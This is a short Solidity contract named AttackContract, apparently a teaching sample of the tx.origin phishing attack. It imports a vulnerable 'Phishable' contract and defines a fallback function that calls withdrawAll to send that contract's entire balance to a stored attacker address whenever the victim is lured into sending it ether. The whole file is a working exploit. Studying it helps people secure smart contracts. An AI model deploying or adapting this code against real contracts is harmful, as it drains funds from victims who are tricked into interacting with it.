pragma solidity ^0.4.24;

import "./Phishable.sol";

contract AttackContract {
    Phishable phishableContract;
    address attacker;

    constructor (Phishable _phishableContract, address _attackerAddress) public {
        phishableContract = _phishableContract;
        attacker = _attackerAddress;
    }

    function () public payable {
        phishableContract.withdrawAll(attacker);
    }
}
